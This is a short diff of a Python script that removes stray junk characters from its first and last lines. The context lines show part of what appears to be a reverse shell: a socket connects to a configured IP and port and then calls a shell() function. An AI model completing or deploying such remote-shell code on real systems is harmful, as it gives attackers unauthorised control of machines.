@@ -1,4 +1,4 @@
-&*? 
+
 #!/usr/bin/python
 # -*- coding: utf-8 -*-
 ##############################
@@ -134,4 +134,4 @@ try:
   s.connect((IP, port))
   shell()
 except Exception: exit(1)
- &?*
+
